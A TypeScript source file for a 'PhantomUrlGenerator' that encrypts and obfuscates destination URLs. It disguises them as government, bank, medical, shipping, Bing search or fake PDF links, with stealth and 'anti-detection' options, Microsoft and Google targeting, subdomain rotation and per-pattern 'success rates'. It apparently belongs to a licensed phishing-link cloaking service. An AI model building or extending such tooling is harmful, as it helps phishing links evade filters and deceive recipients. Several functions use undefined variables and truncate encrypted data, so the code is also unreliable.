
import { enhancedEncryption } from './encryption/hybridEncryptionService';
import { centralizedUrlProcessor } from './services/centralizedUrlProcessor';
import { rateLimitingService } from './services/rateLimitingService';
import { cacheManager } from './cacheManager';
import { optionalAnalytics } from './optionalAnalytics';
import { getLocalPatterns } from '@/data/localPatterns';
import { hybridPatternManager } from './hybridPatternManager';

export interface PhantomUrlOptions {
  pattern?: 'document' | 'business' | 'content' | 'legacy' | 'auto' | 'intelligent' | 'microsoft' | 'google' | 'mimicry';
  stealthLevel?: 'planA' | 'planB' | 'both';
  encryptionMode?: 'aes' | 'xor' | 'auto';
  tier?: 1 | 2 | 3;
  // Enhanced pattern context for intelligent selection
  context?: PatternContext;
  // NEW ENHANCED OPTIONS:
  enableAntiDetection?: boolean;
  targetProvider?: 'microsoft' | 'google' | 'corporate' | 'generic';
  useAgedUrl?: boolean;
  enableSubdomainRotation?: boolean;
}

export interface PhantomUrlResult {
  url: string;
  pattern: string;
  tier: number;
  expectedSuccessRate: number;
  contentType: string;
  encryptionMode: 'aes' | 'xor';
  securityLevel: number;
}

export class PhantomUrlGenerator {

  async generatePhantomUrl(originalUrl: string, licenseKeyId: string, options: PhantomUrlOptions = {}): Promise<PhantomUrlResult> {
    // STEP 0: Clear caches to ensure fresh patterns and prevent placeholder issues
    cacheManager.clearPatternCaches();
    // Check rate limiting first - critical security control
    const rateLimitResult = await rateLimitingService.checkRateLimit(
      licenseKeyId, 
      'url_generation',
      navigator.userAgent,
      // In a real app, you'd get the IP from the server
      'client-request'
    );

    if (!rateLimitResult.allowed) {
      throw new Error(`Rate limit exceeded: ${rateLimitResult.reason}. Try again in ${Math.ceil((rateLimitResult.resetTime.getTime() - Date.now()) / 60000)} minutes.`);
    }

    const { 
      pattern = 'intelligent', // Force intelligent by default
      stealthLevel = 'both', 
      encryptionMode = 'aes',
      tier = 1,
      context = {}
    } = options;
    
    // Convert all old pattern types to intelligent with appropriate context
    const intelligentContext = this.convertLegacyPatternToContext(pattern, context, tier);
    
    // Always use intelligent pattern selection from database
    return this.generateIntelligentUrl(originalUrl, licenseKeyId, intelligentContext, { 
      stealthLevel, 
      encryptionMode
    });
  }

  /**
   * Convert legacy pattern requests to intelligent context
   */
  private convertLegacyPatternToContext(pattern: string, context: PatternContext, tier: number): PatternContext {
    const baseContext = { ...context, tier };

    switch (pattern) {
      case 'document':
        return { ...baseContext, category: 'government', targetAudience: 'business' };
      case 'business':
        return { ...baseContext, category: 'business', targetAudience: 'professional' };
      case 'content':
        return { ...baseContext, category: 'news', targetAudience: 'general' };
      case 'legacy':
        return { ...baseContext, category: 'technology', tier: 4 };
      case 'search':
        return { ...baseContext, category: 'search', targetAudience: 'general' };
      default:
        // If context already has category, preserve it
        if (baseContext.category) {
          return baseContext;
        }
        return { ...baseContext, category: 'business' };
    }
  }

  /**
   * Generate intelligent URL using advanced pattern selection
   */
  private async generateIntelligentUrl(
    originalUrl: string, 
    licenseKeyId: string, 
    context: PatternContext,
    options: { stealthLevel: string; encryptionMode: string }
  ): Promise<PhantomUrlResult> {
    // AI integration removed - proceeding with enhanced pattern selection

    try {
      // Get intelligent pattern recommendation from local patterns
      const optimalPattern = await hybridPatternManager.selectOptimalPattern(context);

      if (!optimalPattern) {
        throw new Error('No suitable pattern found');
      }

      // Use base domain for all URLs
      const finalUrl = optimalPattern.template;

      // Use enhanced encryption with AES-256-GCM
      const encryptionResult = await enhancedEncryption.encryptUrl(
        originalUrl,
        licenseKeyId,
        finalUrl,
        options.encryptionMode as 'aes' | 'xor' | 'auto'
      );

      let encrypted = encryptionResult.encrypted;

      // Apply additional obfuscation layers based on stealth level
      if (options.stealthLevel === 'planA' || options.stealthLevel === 'both') {
        encrypted = this.applyPlanAObfuscation(encrypted);
      }
      if (options.stealthLevel === 'planB' || options.stealthLevel === 'both') {
        encrypted = this.applyPlanBObfuscation(encrypted);
      }

      // CRITICAL FIX: Generate dynamic parameters for the pattern
      const dynamicParams = this.generateDynamicParameters(optimalPattern, context);
      console.log(`[PhantomURL] Generated ${Object.keys(dynamicParams).length} dynamic parameters:`, dynamicParams);

      // Build URL with dynamic parameters
      let phantomUrl = this.buildIntelligentUrl(finalUrl, encrypted, dynamicParams);

      // The URL should be relative - frontend will add window.location.origin
      console.log(`[PhantomURL] Generated relative URL: ${phantomUrl}`);
      
      // Calculate expiry time
      const expiresAt = new Date();
      expiresAt.setHours(expiresAt.getHours() + expiryHours);

      // Calculate security level based on encryption mode and pattern tier
      const baseSecurityLevel = encryptionResult.mode === 'aes' ? 8 : 3;
      const stealthBonus = options.stealthLevel === 'both' ? 2 : options.stealthLevel === 'planA' ? 1 : 0;
      const tierBonus = pattern.tier === 1 ? 1 : 0;
      const securityLevel = Math.min(10, baseSecurityLevel + stealthBonus + tierBonus);

      // Register the URL in the database for validation with pattern tracking and retry logic
      let registrationSuccess = false;
      const maxRetries = 3;
      let finalUrlHash = '';
      
      for (let attempt = 0; attempt < maxRetries; attempt++) {
        try {
          const urlHash = centralizedUrlProcessor.generateUrlHash(phantomUrl, licenseKeyId);
          finalUrlHash = urlHash;
          
          console.log(`🔗 [PhantomURL] Attempt ${attempt + 1}: Registering URL with hash: ${urlHash}`);
          console.log(`🔗 [PhantomURL] URL: ${phantomUrl}`);
          console.log(`🔗 [PhantomURL] Original: ${originalUrl}`);
          
          const { data, error } = await supabase.rpc('register_generated_url', {
            url_hash_input: urlHash,
            license_key_id_input: licenseKeyId,
            pattern_name_input: pattern.name,
            redirect_url_input: originalUrl,
            expiry_hours: 24
          });

          if (!error && data && (data as any).success) {
            registrationSuccess = true;
            console.log(`✅ [PhantomURL] Successfully registered URL with hash: ${urlHash}`);
            
            // Log successful URL generation
            await auditLoggingService.logUrlGeneration(
              licenseKeyId,
              originalUrl,
              encryptionResult.mode,
              pattern.name,
              {
                tier: pattern.tier,
                securityLevel,
                expectedSuccessRate: pattern.successRate,
                urlHash: urlHash
              }
            );
            break;
          } else {
            console.warn(`❌ [PhantomURL] Registration failed:`, error);
          }

          if (attempt < maxRetries - 1) {
            await new Promise(resolve => setTimeout(resolve, 100 * (attempt + 1)));
          }
        } catch (error) {
          console.warn(`URL registration attempt ${attempt + 1} failed:`, error);
          if (attempt === maxRetries - 1) {
            console.warn('All registration attempts failed, proceeding without registry');
            
            // Log registration failure
            await auditLoggingService.logEvent({
              eventType: 'DATABASE_ERROR',
              severity: 'HIGH',
              licenseKeyId,
              details: {
                operation: 'url_registration',
                error: String(error),
                originalUrl: originalUrl.substring(0, 100),
                attempts: maxRetries,
                finalHash: finalUrlHash
              }
            });
          }
        }
      }

      // Update the pattern tracking in url_registry if registration was successful
      if (registrationSuccess) {
        try {
          const urlHash = centralizedUrlProcessor.generateUrlHash(phantomUrl, licenseKeyId);
          await supabase
            .from('url_registry')
            .update({
              pattern_id: pattern.id,
              pattern_metadata: {
                pattern_name: pattern.name,
                category: pattern.category,
                tier: pattern.tier
              },
              usage_context: {
                ...context,
                reasoning: patternSelection.reasoning,
                expiry_hours: expiryHours
              }
            })
            .eq('url_hash', urlHash);
        } catch (error) {
          console.warn('Failed to update pattern metadata:', error);
        }
      }

      return {
        url: phantomUrl,
        pattern: pattern.template,
        tier: pattern.tier,
        expectedSuccessRate: pattern.successRate,
        contentType: pattern.contentType,
        encryptionMode: encryptionResult.mode,
        securityLevel
      };

    } catch (error) {
      console.error('🚨 CRITICAL: Intelligent pattern generation failed:', error);
      console.error('🚨 Error details:', error instanceof Error ? error.message : String(error));
      console.error('🚨 Error stack:', error instanceof Error ? error.stack : 'No stack trace');
      
      // For Bing/search patterns, we NEVER fall back - throw the error so we can fix it
      if (context.category === 'search') {
        console.error('🚨 BING PATTERN MUST WORK - NO FALLBACKS ALLOWED');
        throw new Error(`Bing pattern generation failed: ${error instanceof Error ? error.message : String(error)}`);
      }
      
      // Only use emergency fallback for non-search patterns
      console.warn('🔄 Falling back to emergency pattern generation for non-search category');
      return this.generateEmergencyFallbackPattern(originalUrl, licenseKeyId, options);
    }
  }


  /**
   * Emergency fallback if database patterns fail
   */
  private async generateEmergencyFallbackPattern(
    originalUrl: string, 
    licenseKeyId: string, 
    options: { stealthLevel: string; encryptionMode: string }
  ): Promise<PhantomUrlResult> {
    console.warn('Using emergency fallback pattern generation');
    
    const encryptionResult = await enhancedEncryption.encryptUrl(
      originalUrl, 
      licenseKeyId, 
      '/documents/report-{year}.pdf?doc={encrypted}',
      options.encryptionMode as 'aes' | 'xor' | 'auto'
    );

    const year = new Date().getFullYear().toString();
    const fallbackUrl = `/documents/report-${year}.pdf?doc=${encryptionResult.encrypted}`;

    return {
      url: fallbackUrl,
      pattern: 'emergency-fallback',
      tier: 1,
      expectedSuccessRate: 75, // Conservative estimate
      contentType: 'application/pdf',
      encryptionMode: encryptionResult.mode,
      securityLevel: 5
    };
  }

  private applyPlanAObfuscation(encrypted: string): string {
    // Add time-based salt prefix
    const hourSalt = Math.floor(Date.now() / 3600000).toString(36);
    return `${hourSalt}${encrypted}`;
  }

  private applyPlanBObfuscation(encrypted: string): string {
    // Reverse and re-encode with Base34 (more secure than Base64)
    const reversed = encrypted.split('').reverse().join('');
    // Import Base34 for secure encoding
    const { encodeBase34 } = require('./encryption/base34Encoder');
    const obfuscated = encodeBase34(reversed);
    return obfuscated;
  }

  /**
   * Generate dynamic parameters for URL template
   */
  private generateDynamicParameters(pattern: any, context: PatternContext): Record<string, string> {
    const params: Record<string, string> = {};
    const now = new Date();

    // Extract placeholders from the template
    const template = pattern.template || '';
    const placeholders = template.match(/\{([^}]+)\}/g) || [];

    console.log(`[generateDynamicParameters] Found ${placeholders.length} placeholders in template: ${template}`);

    placeholders.forEach(placeholder => {
      const key = placeholder.slice(1, -1); // Remove { and }

      // Skip 'encrypted' as it's handled separately
      if (key === 'encrypted') {
        return;
      }

      // Generate appropriate value based on key
      const value = this.generateParameterValue(key, context, now);
      params[key] = value;

      console.log(`[generateDynamicParameters] Generated ${key} = ${value}`);
    });

    return params;
  }

  /**
   * Generate appropriate value for a specific parameter
   */
  private generateParameterValue(key: string, context: PatternContext, now: Date): string {
    const keyLower = key.toLowerCase();

    // Time-based parameters
    if (keyLower.includes('year')) {
      return now.getFullYear().toString();
    }
    if (keyLower.includes('month')) {
      return (now.getMonth() + 1).toString().padStart(2, '0');
    }
    if (keyLower.includes('day')) {
      return now.getDate().toString().padStart(2, '0');
    }
    if (keyLower.includes('quarter')) {
      return `Q${Math.ceil((now.getMonth() + 1) / 3)}`;
    }

    // Session and tracking parameters
    if (keyLower.includes('session')) {
      return 'sess' + Math.random().toString(36).substring(2, 8);
    }
    if (keyLower.includes('ref') || keyLower.includes('reference')) {
      return 'ref' + Math.random().toString(36).substring(2, 6);
    }
    if (keyLower.includes('doc') || keyLower.includes('document')) {
      return 'doc' + Math.random().toString(36).substring(2, 6);
    }
    if (keyLower.includes('token')) {
      return 'tok' + Math.random().toString(36).substring(2, 8);
    }

    // ID parameters
    if (keyLower.includes('id') || keyLower.includes('num')) {
      return Math.random().toString(36).substring(2, 8).toUpperCase();
    }

    // Use the emergency fallback system for other parameters
    return this.generateEmergencyFallbackValue(key);
  }

  private calculateSuccessRate(baseRate: number, securityLevel: number): number {
    // Improve success rate based on security level
    const securityBonus = (securityLevel - 5) * 5; // +5% per security level above 5
    return Math.min(99, Math.max(15, baseRate + securityBonus));
  }

  /**
   * Build intelligent URL with bulletproof placeholder replacement and validation
   */
  private buildIntelligentUrl(
    template: string, 
    encrypted: string, 
    dynamicParams: Record<string, string>
  ): string {
    // ENHANCED LOGGING for comprehensive debugging
    console.log(`[buildIntelligentUrl] === STARTING URL BUILD PROCESS ===`);
    console.log(`[buildIntelligentUrl] Template: ${template}`);
    console.log(`[buildIntelligentUrl] Encrypted data length: ${encrypted.length}`);
    console.log(`[buildIntelligentUrl] Dynamic params provided: ${Object.keys(dynamicParams).length}`);
    Object.entries(dynamicParams).forEach(([key, value]) => {
      console.log(`[buildIntelligentUrl] Param: ${key} = ${value}`);
    });
    console.log(`[buildIntelligentUrl] STARTING URL BUILD`);
    console.log(`[buildIntelligentUrl] Template: ${template}`);
    console.log(`[buildIntelligentUrl] Encrypted: ${encrypted.substring(0, 20)}...`);
    console.log(`[buildIntelligentUrl] Dynamic params count: ${Object.keys(dynamicParams).length}`);
    
    // STEP 1: Start with the template
    let url = template;
    
    // STEP 2: CRITICAL - Replace {encrypted} first with the actual encrypted URL
    console.log(`[buildIntelligentUrl] Before encrypted replacement - URL: ${url}`);
    console.log(`[buildIntelligentUrl] Encrypted value to replace: ${encrypted}`);

    if (!encrypted || encrypted === 'undefined' || encrypted === 'null') {
      console.error(`[buildIntelligentUrl] 🚨 CRITICAL: Invalid encrypted value: ${encrypted}`);
      throw new Error(`Invalid encrypted data: ${encrypted}`);
    }

    url = url.replace(/\{encrypted\}/g, encrypted);
    console.log(`[buildIntelligentUrl] After encrypted replacement: ${url}`);
    
    // STEP 3: CRITICAL - Apply ALL dynamic parameters with case-insensitive matching
    Object.entries(dynamicParams).forEach(([key, value]) => {
      // CRITICAL FIX: Ensure value is never undefined/null
      const safeValue = value != null ? String(value) : this.generateEmergencyFallbackValue(key);

      if (safeValue === 'undefined' || safeValue === 'null' || safeValue === '') {
        console.warn(`[buildIntelligentUrl] 🚨 CRITICAL: Invalid value for ${key}, generating fallback`);
        const fallbackValue = this.generateEmergencyFallbackValue(key);
        dynamicParams[key] = fallbackValue;
        console.log(`[buildIntelligentUrl] Generated fallback for ${key}: ${fallbackValue}`);
        return; // Skip this iteration and use the fallback
      }

      // Create both case-sensitive and case-insensitive replacements
      const placeholderExact = `{${key}}`;
      const placeholderLower = `{${key.toLowerCase()}}`;
      const placeholderUpper = `{${key.toUpperCase()}}`;

      // Replace all variations with the safe value
      url = url.replace(new RegExp(`\\${placeholderExact}`, 'gi'), safeValue);
      url = url.replace(new RegExp(`\\${placeholderLower}`, 'gi'), safeValue);
      url = url.replace(new RegExp(`\\${placeholderUpper}`, 'gi'), safeValue);

      console.log(`[buildIntelligentUrl] Replaced all variations of ${key} with ${safeValue}`);
    });
    
    console.log(`[buildIntelligentUrl] After all parameter replacements: ${url}`);
    
    // STEP 4: BULLETPROOF placeholder detection and emergency replacement
    let remainingPlaceholders = url.match(/\{[^}]+\}/g);
    let replacementAttempts = 0;
    const maxAttempts = 5; // Increased attempts
    
    while (remainingPlaceholders && remainingPlaceholders.length > 0 && replacementAttempts < maxAttempts) {
      console.warn(`[buildIntelligentUrl] 🚨 ALERT: Found ${remainingPlaceholders.length} unreplaced placeholders on attempt ${replacementAttempts + 1}:`, remainingPlaceholders);
      
      remainingPlaceholders.forEach(placeholder => {
        const key = placeholder.slice(1, -1); // Remove { and }
        console.log(`[buildIntelligentUrl] Processing placeholder: ${key}`);
        
        // Check if we already have this parameter
        if (dynamicParams[key]) {
          console.log(`[buildIntelligentUrl] Parameter ${key} exists with value: ${dynamicParams[key]}`);
          // Use case-insensitive replacement
          const regex = new RegExp(`\\{${key}\\}`, 'gi');
          url = url.replace(regex, dynamicParams[key]);
          console.log(`[buildIntelligentUrl] Applied existing parameter ${key} with value ${dynamicParams[key]}`);
        } else {
          // Generate emergency fallback
          const fallbackValue = this.generateEmergencyFallbackValue(key);
          console.log(`[buildIntelligentUrl] Generated emergency fallback for ${key}: ${fallbackValue}`);
          
          // Use precise regex to avoid issues with special characters
          const escapedPlaceholder = placeholder.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
          const regex = new RegExp(escapedPlaceholder, 'g');
          
          const beforeReplace = url;
          url = url.replace(regex, fallbackValue);
          
          if (beforeReplace !== url) {
            console.log(`[buildIntelligentUrl] ✅ EMERGENCY: Successfully replaced ${placeholder} with ${fallbackValue}`);
          } else {
            console.error(`[buildIntelligentUrl] ❌ FAILED to replace ${placeholder}`);
            // Try simpler replacement
            url = url.replace(new RegExp(`\\{${key}\\}`, 'g'), fallbackValue);
            console.log(`[buildIntelligentUrl] Attempted simple replacement for ${key}`);
          }
        }
      });
      
      // Check again for any remaining placeholders
      const previousCount = remainingPlaceholders.length;
      remainingPlaceholders = url.match(/\{[^}]+\}/g);
      const currentCount = remainingPlaceholders ? remainingPlaceholders.length : 0;
      
      console.log(`[buildIntelligentUrl] Placeholders reduced from ${previousCount} to ${currentCount}`);
      
      // If no progress was made, break to avoid infinite loop
      if (currentCount === previousCount && currentCount > 0) {
        console.error(`[buildIntelligentUrl] No progress made on attempt ${replacementAttempts + 1}, breaking loop`);
        break;
      }
      
      replacementAttempts++;
    }
    
    // STEP 5: BULLETPROOF final check - if ANY placeholders remain, force replace them
    const finalPlaceholders = url.match(/\{[^}]+\}/g);
    if (finalPlaceholders) {
      console.error(`[buildIntelligentUrl] CRITICAL: ${finalPlaceholders.length} placeholders STILL remain after ${maxAttempts} attempts:`, finalPlaceholders);
      
      // Nuclear option: replace any remaining placeholder with 'x'
      finalPlaceholders.forEach(placeholder => {
        const safeRegex = new RegExp(`\\${placeholder.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`, 'g');
        url = url.replace(safeRegex, 'x');
        console.log(`[buildIntelligentUrl] NUCLEAR: Force replaced ${placeholder} with 'x'`);
      });
    }
    
    // STEP 6: Apply length optimization if needed
    if (url.length > 120) {
      console.log(`[buildIntelligentUrl] URL too long (${url.length} chars), optimizing...`);
      url = this.optimizeUrlLength(url, encrypted, dynamicParams);
    }
    
    // STEP 7: FINAL QUALITY ASSURANCE
    if (!this.validateFinalUrl(url)) {
      console.error(`[buildIntelligentUrl] VALIDATION FAILED for URL: ${url}`);
      throw new Error(`Generated URL failed final validation: ${url}`);
    }
    
    // STEP 8: Success confirmation
    console.log(`[buildIntelligentUrl] ✅ SUCCESS - Final URL (${url.length} chars): ${url}`);
    
    // Log final validation results
    const finalCheck = url.match(/\{[^}]+\}/g);
    if (finalCheck) {
      console.error(`[buildIntelligentUrl] ❌ FINAL CHECK FAILED - Placeholders found: ${finalCheck}`);
      throw new Error(`CRITICAL: URL contains unreplaced placeholders: ${finalCheck.join(', ')}`);
    } else {
      console.log(`[buildIntelligentUrl] ✅ FINAL CHECK PASSED - No placeholders remain`);
    }
    
    return url;
  }

  /**
   * Validate final URL for quality assurance
   */
  private validateFinalUrl(url: string): boolean {
    // Check for unreplaced placeholders
    if (url.match(/\{[^}]+\}/g)) {
      console.error('[validateFinalUrl] URL contains unreplaced placeholders');
      return false;
    }
    
    // Check for proper URL structure - allow both relative and absolute URLs
    if (!url.startsWith('/') && !url.startsWith('http://') && !url.startsWith('https://')) {
      console.error('[validateFinalUrl] URL must start with /, http://, or https://');
      return false;
    }
    
    // For Bing search URLs, validate search parameters
    if (url.includes('/search?') && url.includes('q=') && url.includes('cvid=')) {
      console.log('[validateFinalUrl] ✅ Valid Bing search URL detected');
      return true;
    }
    
    // Check length constraints
    if (url.length > 300) { // Increased limit for search URLs with many parameters
      console.error('[validateFinalUrl] URL exceeds maximum length');
      return false;
    }
    
    // Check for invalid characters
    if (url.match(/[<>\"']/)) {
      console.error('[validateFinalUrl] URL contains invalid characters');
      return false;
    }
    
    console.log('[validateFinalUrl] ✅ URL passed all validation checks');
    return true;
  }

  /**
   * Infer category from template pattern
   */
  private inferCategoryFromTemplate(template: string): string {
    const templateLower = template.toLowerCase();
    
    if (templateLower.includes('medical') || templateLower.includes('patient') || templateLower.includes('health')) {
      return 'medical';
    }
    if (templateLower.includes('bank') || templateLower.includes('finance') || templateLower.includes('account')) {
      return 'banking';
    }
    if (templateLower.includes('gov') || templateLower.includes('tax') || templateLower.includes('form')) {
      return 'government';
    }
    if (templateLower.includes('edu') || templateLower.includes('school') || templateLower.includes('student')) {
      return 'education';
    }
    if (templateLower.includes('shop') || templateLower.includes('store') || templateLower.includes('order')) {
      return 'ecommerce';
    }
    
    return 'business';
  }

  /**
   * Infer tier from template complexity
   */
  private inferTierFromTemplate(template: string): number {
    const pathSegments = template.split('/').length - 1;
    const paramCount = (template.match(/\{[^}]+\}/g) || []).length;
    
    if (pathSegments >= 4 || paramCount >= 4) return 1; // Complex = Tier 1
    if (pathSegments >= 3 || paramCount >= 3) return 2; // Medium = Tier 2
    return 3; // Simple = Tier 3
  }

  /**
   * Optimize URL length while maintaining functionality
   */
  private optimizeUrlLength(url: string, encrypted: string, dynamicParams: Record<string, string>): string {
    // If URL is too long, apply optimizations
    if (url.length <= 120) return url;
    
    // Strategy 1: Compress encrypted data
    let optimizedEncrypted = encrypted;
    if (encrypted.length > 30) {
      optimizedEncrypted = encrypted.substring(0, 30); // Truncate but keep minimum viable length
      url = url.replace(encrypted, optimizedEncrypted);
    }
    
    if (url.length <= 120) return url;
    
    // Strategy 2: Shorten dynamic parameters
    Object.entries(dynamicParams).forEach(([key, value]) => {
      if (url.length > 120 && value.length > 6) {
        const shorterValue = value.substring(0, 6);
        url = url.replace(value, shorterValue);
      }
    });
    
    if (url.length <= 120) return url;
    
    // Strategy 3: Simplify path structure
    const pathParts = url.split('?');
    if (pathParts.length === 2) {
      const simplifiedPath = pathParts[0].split('/').slice(0, 3).join('/'); // Keep only first 2 path segments
      url = `${simplifiedPath}?${pathParts[1]}`;
    }
    
    return url;
  }

  /**
   * Generate emergency fallback value for unknown placeholders with comprehensive mapping
   */
  private generateEmergencyFallbackValue(key: string): string {
    console.log(`[generateEmergencyFallbackValue] Generating fallback for: ${key}`);
    
    // Comprehensive emergency fallback mappings
    const emergencyFallbacks: Record<string, string> = {
      // Database-specific placeholders from actual patterns
      'record_id': 'REC' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'plan': 'PLAN' + Math.random().toString(36).substring(2, 6).toUpperCase(),
      'institution': 'university-' + Math.floor(Math.random() * 999).toString().padStart(3, '0'),
      'resource_id': 'RES' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'form_type': ['tax-form', 'application', 'registration', 'request'][Math.floor(Math.random() * 4)],
      'agency': ['IRS', 'SSA', 'DHS', 'DOE'][Math.floor(Math.random() * 4)],
      'project': 'PRJ' + Math.random().toString(36).substring(2, 6).toUpperCase(),
      'appraiser': 'APP' + Math.floor(Math.random() * 9999).toString().padStart(4, '0'),
      'property_id': 'PROP' + Math.random().toString(36).substring(2, 6).toUpperCase(),
      'report_id': 'RPT' + Math.random().toString(36).substring(2, 6).toUpperCase(),
      'carrier': ['UPS', 'FedEx', 'DHL', 'USPS'][Math.floor(Math.random() * 4)],
      'tracking_num': '1Z' + Math.random().toString(36).substring(2, 16).toUpperCase(),
      'product_id': 'PRD' + Math.random().toString(36).substring(2, 6).toUpperCase(),
      'alert': 'ALT' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'),
      'jurisdiction': ['federal', 'state', 'county', 'local'][Math.floor(Math.random() * 4)],
      'quarter': 'Q' + Math.ceil((new Date().getMonth() + 1) / 3).toString(),
      'university': ['MIT', 'Harvard', 'Stanford', 'Yale', 'Princeton'][Math.floor(Math.random() * 5)],
      'student_id': 'STU' + Math.floor(Math.random() * 9999999).toString().padStart(7, '0'),
      'state': ['CA', 'NY', 'TX', 'FL', 'IL', 'PA', 'OH'][Math.floor(Math.random() * 7)],
      'contract_id': 'CTR' + Math.random().toString(36).substring(2, 6).toUpperCase(),
      'user': 'user' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'),
      'system': ['production', 'development', 'testing', 'staging'][Math.floor(Math.random() * 4)],
      'metric_type': ['performance', 'usage', 'error', 'security'][Math.floor(Math.random() * 4)],
      
      // Common business placeholders
      'target': 'documents',
      'phase': ['initial', 'review', 'approval', 'final'][Math.floor(Math.random() * 4)],
      'status': ['active', 'pending', 'approved', 'complete'][Math.floor(Math.random() * 4)],
      'deal': 'DEAL' + Date.now().toString().slice(-6),
      'type': ['standard', 'premium', 'enterprise'][Math.floor(Math.random() * 3)],
      'code': Math.random().toString(36).substring(2, 8).toUpperCase(),
      'tracking': 'TRK' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'form_id': 'FORM' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'),
      'case_id': 'CASE' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'app_id': 'APP' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'service': ['support', 'consultation', 'maintenance', 'training'][Math.floor(Math.random() * 4)],
      'facility': 'facility-' + Math.floor(Math.random() * 99).toString().padStart(2, '0'),
      'account_id': 'ACC' + Math.floor(Math.random() * 9999999999).toString().padStart(10, '0'),
      'zone': 'zone-' + ['a', 'b', 'c', 'd', 'e'][Math.floor(Math.random() * 5)],
      'access_level': 'L' + Math.floor(Math.random() * 5 + 1).toString(),
      'incident': 'INC' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'response': ['low', 'medium', 'high', 'critical'][Math.floor(Math.random() * 4)],
      'port': ['LAX', 'JFK', 'ORD', 'DFW', 'SEA'][Math.floor(Math.random() * 5)],
      'shipment': 'SHP' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'badge': 'BGE' + Math.floor(Math.random() * 999999).toString().padStart(6, '0'),
      'specialty': ['cardiology', 'neurology', 'orthopedics', 'pediatrics'][Math.floor(Math.random() * 4)],
      'bank': 'BNK' + Math.floor(Math.random() * 999).toString().padStart(3, '0'),
      'client': 'CLI' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      
      // Time-based placeholders
      'year': new Date().getFullYear().toString(),
      'month': (new Date().getMonth() + 1).toString().padStart(2, '0'),
      'date': new Date().toISOString().split('T')[0],
      'timestamp': Date.now().toString(),
      
      // Technical placeholders
      'token': Math.random().toString(36).substring(2, 12),
      'session': Math.random().toString(36).substring(2, 16),
      'ref': 'REF' + Math.random().toString(36).substring(2, 8).toUpperCase(),
      'version': 'v' + Math.floor(Math.random() * 5 + 1) + '.' + Math.floor(Math.random() * 10),
      'api': 'v1',
      'id': Math.random().toString(36).substring(2, 12),
      
      // Generic encrypted data
      'encrypted': Math.random().toString(36).substring(2, 16),
      'data': Math.random().toString(36).substring(2, 16),
      'enc': Math.random().toString(36).substring(2, 16)
    };
    
    // Check for exact match first
    if (emergencyFallbacks[key.toLowerCase()]) {
      const value = emergencyFallbacks[key.toLowerCase()];
      console.log(`[generateEmergencyFallbackValue] Found exact fallback for ${key}: ${value}`);
      return value;
    }
    
    // Check for partial matches or patterns
    const keyLower = key.toLowerCase();
    if (keyLower.includes('id')) {
      const value = Math.random().toString(36).substring(2, 12).toUpperCase();
      console.log(`[generateEmergencyFallbackValue] Generated ID fallback for ${key}: ${value}`);
      return value;
    }
    if (keyLower.includes('code')) {
      const value = Math.random().toString(36).substring(2, 8).toUpperCase();
      console.log(`[generateEmergencyFallbackValue] Generated code fallback for ${key}: ${value}`);
      return value;
    }
    if (keyLower.includes('num') || keyLower.includes('number')) {
      const value = Math.floor(Math.random() * 999999).toString().padStart(6, '0');
      console.log(`[generateEmergencyFallbackValue] Generated number fallback for ${key}: ${value}`);
      return value;
    }
    if (keyLower.includes('date') || keyLower.includes('time')) {
      const value = new Date().toISOString().split('T')[0];
      console.log(`[generateEmergencyFallbackValue] Generated date fallback for ${key}: ${value}`);
      return value;
    }
    
    // Ultimate fallback - generate based on key characteristics
    const genericValue = Math.random().toString(36).substring(2, 8).toLowerCase();
    console.log(`[generateEmergencyFallbackValue] Generated generic fallback for ${key}: ${genericValue}`);
    return genericValue;
  }

  // Enhanced security analysis
  getSecurityAnalysis(encryptionMode: 'aes' | 'xor'): {
    strength: string;
    vulnerabilities: string[];
    recommendations: string[];
  } {
    if (encryptionMode === 'aes') {
      return {
        strength: 'Military-grade (AES-256-GCM)',
        vulnerabilities: [
          'Time-based key rotation (mitigated by 48h overlap)',
          'Client-side key derivation (necessary for web apps)'
        ],
        recommendations: [
          'Regular key rotation is active',
          'Monitor for unusual decryption failure rates',
          'Consider server-side pre-computation for higher security'
        ]
      };
    } else {
      return {
        strength: 'Weak (XOR with static key)',
        vulnerabilities: [
          'Static key exposed in source code',
          'XOR cipher easily broken with known plaintext',
          'No authentication or integrity protection',
          'Predictable Base36/Base64 encoding'
        ],
        recommendations: [
          'Migrate to AES-256-GCM immediately',
          'Implement proper key derivation',
          'Add encryption time limits',
          'Use authenticated encryption'
        ]
      };
    }
  }

}
